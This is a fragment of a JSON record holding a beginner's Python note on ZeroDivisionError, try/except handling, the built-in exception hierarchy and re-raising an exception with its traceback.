    "description": "# Example of a ZeroDivisionError:  number = 43/0 print(number)  \"\"\" You can not divide by zero in Python, otherwise a rather unpleasant and  hard-to-read message comes up. To prevent this sort of thing from happening, use the try - except function. \"\"\"  try:   print(43/0) except ZeroDivisionError:   print(\"Dividing by zero is not allowed!\")  \"\"\" This way, Python will print the answer, UNLESS there is a ZeroDivisionError, in which case Python, instead of printing the error message, will print that you cannot divide by zero. \"\"\"\nBaseException    ] SystemExit    ] KeyboardInterrupt    ] GeneratorExit    ] Exception         ] StopIteration         ] StopAsyncIteration         ] ArithmeticError         |    ] FloatingPointError         |    ] OverflowError         |    ] ZeroDivisionError         ] AssertionError         ] AttributeError         ] BufferError         ] EOFError         ] ImportError         |    ] ModuleNotFoundError         ] LookupError         |    ] IndexError         |    ] KeyError         ] MemoryError         ] NameError         |    ] UnboundLocalError         ] OSError         |    ] BlockingIOError         |    ] ChildProcessError         |    ] ConnectionError         |    |    ] BrokenPipeError         |    |    ] ConnectionAbortedError         |    |    ] ConnectionRefusedError         |    |    ] ConnectionResetError         |    ] FileExistsError         |    ] FileNotFoundError         |    ] InterruptedError         |    ] IsADirectoryError         |    ] NotADirectoryError         |    ] PermissionError         |    ] ProcessLookupError         |    ] TimeoutError         ] ReferenceError         ] RuntimeError         |    ] NotImplementedError         |    ] RecursionError         ] SyntaxError         |    ] IndentationError         |         ] TabError         ] SystemError         ] TypeError         ] ValueError         |    ] UnicodeError         |         ] UnicodeDecodeError         |         ] UnicodeEncodeError         |         ] UnicodeTranslateError         ] Warning              ] DeprecationWarning              ] PendingDeprecationWarning              ] RuntimeWarning              ] SyntaxWarning              ] UserWarning              ] FutureWarning              ] ImportWarning              ] UnicodeWarning              ] BytesWarning              ] ResourceWarning\ntry:     ... except SomeException:     tb = sys.exc_info()[2]     raise OtherException(...).with_traceback(tb) \n",
    "reg_date": "2021-10-12T11:35:43.000Z"
  }
]